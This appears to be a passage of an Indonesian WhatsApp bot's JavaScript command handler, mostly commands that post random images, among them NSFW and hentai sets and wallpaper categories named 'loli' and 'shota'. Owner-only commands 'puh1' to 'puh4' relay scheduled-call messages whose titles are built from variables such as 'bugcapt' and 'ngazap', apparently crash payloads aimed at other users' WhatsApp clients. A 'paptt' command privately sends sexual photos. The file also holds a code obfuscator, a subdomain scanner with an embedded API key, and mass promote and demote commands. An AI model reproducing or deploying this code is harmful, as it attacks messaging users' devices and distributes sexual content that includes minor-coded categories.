var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return XeonStickGroup()
	
        
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thighs':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return XeonStickGroup()

XeonStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await Biiofc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return XeonStickGroup()

XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await Biiofc.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return XeonStickGroup()

XeonStickWait()
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break      
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{

XeonStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
Biiofc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break

case  'tqto': {
  let tqtonya = `
  _*TERIMA KASIH KEPADA*_

  *• ALLAH SWT*
  *• NABI MUHAMMAD SAW*
  *• MY PARENTS*
  *• Rafathar Offcial ( Author )*
  *• LoL-Human ( Rest APIs )*
  *• BMTH ( TEAMS )*
  *• Para Penyedia Module*
  *• Para Donatur*
  `;
  Biiofc.sendMessage(m.chat, {
    text: tqtonya,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${pushname}`,
        body: 'RafatharOffcial',
        thumbnailUrl: "https://telegra.ph/file/8633bf5076b7da7d3ce9e.jpg",
        sourceUrl: "https://chat.whatsapp.com/KvYPtEsQAYCFpqtitE2nP2",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  })
}
break

case 'paptt':
            if (!isPremium) return reply(mess.premium)
            if (!q) return reply(`Example ${prefix + command} foto/video`)
            let papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
            let papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
            let titid1 = (pickRandom(papttfoto))
            let titid2 = (pickRandom(papttvideo))
            if (q == 'foto') {
                reply("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
                Biiofc.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            } else if (q == 'video') {
                reply("Video Akan Dikirim Lewat Private Chat ( *PC* )")
                Biiofc.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            }
        break
case 'enc': {
            if (!isOwner) return reply(mess.owner)
            if (!q) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            reply(`${meg.result}`)
        }
        break
case 'buatgc':
            if (!isPremium) return reply(mess.premium)
            if (!text) return reply('_Masukkan Nama Grup!_')
            try{
                reply(mess.wait)
                let group = await Biiofc.groupCreate(text, [m.sender])
                let link = await Biiofc.groupInviteCode(group.gid)
                let url = 'https://chat.whatsapp.com/' + link;
                /// console.log(chalk.bold.red('Membuat Grup: ' + group.gid + '\nNama Grup: ' + text + '\n\nViolet'))
                reply('_Berhasil Membuat Grup *' + text + '*_\n\n*Nama:* ' + text + '\n*ID:* ' + group.gid + '\n*Link:* ' + url)
            } catch (e) {
                let [namagc, partici] = text.split('|')
                if (!namagc) return reply('Format Salah!!!')
                if (!partici) return reply('Tag user sebagai member baru!')
                let mem = Biiofc.parseMention(`@${parseInt(m.sender)} ${partici}`)
                let ha = await Biiofc.groupCreate(namagc, mem).catch(console.error)
                console.log(JSON.stringify(ha));
                await reply(`*GROUP CREATE*

\`\`\`Group Telah Dibuat @${m.sender.replace(/@.+/, '')}\`\`\`


${JSON.stringify(ha.participants)}`)
                Biiofc.groupMakeAdmin(ha.gid, [m.sender])
                if (!isOwner) {
                    await Biiofc.modifyChat(ha.gid, 'delete', {
                        includeStarred: false
                    }).catch(console.error)
                    Biiofc.groupLeave(ha.gid)
                }
            }
        break
case'promoteall':
if (!isOwner) return reply('*Khusus Rafathar Offcial Doang Woii!!*')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.groupParticipantsUpdate(from, mems, 'promote')
break
case'demoteall':
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.groupParticipantsUpdate(from, mems, 'demote')
break
case 'subfinder': {
  if (!isOwner) return reply('Mohon maaf, hanya pembuat yang dapat menggunakan perintah ini.')
  if (!q) return reply('Silakan masukkan nama domain.')
  let feta = await fetchJson(`https://api.caliph.biz.id/api/scan/subdomain?host=${q}&apikey=fZ69bJCk`);
  if (!feta.status) return reply(feta.message) 
  
  let list = '*List Subdomain*\n\n'
  for (let L of feta.result) {
    list += `Name: ${L.domain}\nDNS: ${L.dns}\nProxy: ${L.cf_proxy ? "✅" : "❌"}\n\n`
  }
  
  Biiofc.sendMessage(from, { text: list.trim() }, { quoted: m })
  } 
  break;
case  'capilip': {
if (!isOwner) return reply('Mohon maaf, hanya pembuat yang dapat menggunakan perintah ini.')
let anu = await fetchJson(`-`)
await reply(`》Username : ${anu.username}\n》Limit : ${anu.limit}\n》Premium : ${anu.premium}\n》Expired : ${anu.expired}`)
}
break
case 'capi':{
if (!isOwner) return m.reply('*_Maaf, Commando Ini Khusus Pemilik Bot._*')
axios.get(`-`).then(({ data }) => {		
         let tekscapi = `API INFOMATION`
			tekscapi += `
Username : ` + data.result.username
tekscapi += `
Request :` + data.result.request
tekscapi += `
Email :` + data.result.email
tekscapi += `
Limit :` + data.result.limit
tekscapi += `
Premium :` + data.result.premium
				
               m.reply(tekscapi)
			})
			.catch(console.error)
	}
					break
case 'puh1': {
if (!isOwner) return m.reply("ngapain?") 
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${buttonkal}`
 }
}
Biiofc.relayMessage(m.chat, call, {})
}
break
case 'puh2': {
if (!isOwner) return m.reply("ngapain?") 
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${ios1}${ios1}${mdelay}`
 }
}
Biiofc.relayMessage(m.chat, call, {})
}
break
case 'puh3': {
if (!isOwner) return m.reply("ngapain?") 
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${ios2}${ios2}${ngazap}`
 }
}
Biiofc.relayMessage(m.chat, call, {})
}
break
case 'puh4': {
if (!isOwner) return m.reply("ngapain?") 
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${bugcapt}${bugcapt}${zovcgay}`
 }
}
Biiofc.relayMessage(m.chat, call, {})
}
break
case 'bre': {
if (!isOwner) return m.reply("ngapain?") 
if (!text) return m.reply(`text ny mn?`)
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: text
 }
}
Biiofc.relayMessage(m.chat, call, {})
}
  break
case 'setbiobot':{
   if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
   if (!text) throw `Masukan Text.`
     try {
		await Biiofc.updateProfileStatus(text).catch(_ => _)
		reply(m.chat, 'SUCCESS ✅️', m)
} catch {
       throw 'Error'
     }
}
break
	case 'setppbot': case 'setbotpp': {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
if (!quoted) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var medis = await Biiofc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await Biiofc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await Biiofc.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
}
}
break
case 'setppgroup': {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!quoted) return reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await Biiofc.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await Biiofc.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await Biiofc.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
    await Biiofc.removeProfilePicture(from)
    }
    break
case 'toaud': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await Biiofc.downloadMediaMessage(quoted)
let { toAudio } = require('./freya/converter')
let audio = await toAudio(media, 'mp4')
Biiofc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tovn': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./freya/converter')
let audio = await toPTT(media, 'mp4')
Biiofc.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6283183432282',
title: `Rafathar Offcial`,
sourceUrl: `https://wa.me/6283183432282`, 
thumbnail: thumb
}
}})
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
  let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
  if (!/image/.test(mime)) throw respond
  if (!text) throw respond
  reply(`Proses Tuan...`)
  let atas = text.split('|')[0] ? text.split('|')[0] : '-'
  let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  let { TelegraPh } = require('./freya/uploader')
  try {
  let mee = await Biiofc.downloadAndSaveMediaMessage(quoted)
  let mem = await TelegraPh(mee)
  let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
  let awikwok = await Biiofc.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(awikwok)
  } catch (e) {
  reply(`Sedang Maintenance Tuan`)
  }
  }
  break 
case 'getname': {
if (!isOwner) return m.reply('*khusus Premium*')
await Biiofc
if (qtod === "true") {
namenye = await Biiofc.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
Biiofc.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
  case 'ghstalk': case 'githubstalk':{
if (!q) return reply(`Example ${prefix+command} DGXeon`)
XeonStickWait()
aj = await githubstalk.githubstalk(`${q}`)
Biiofc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
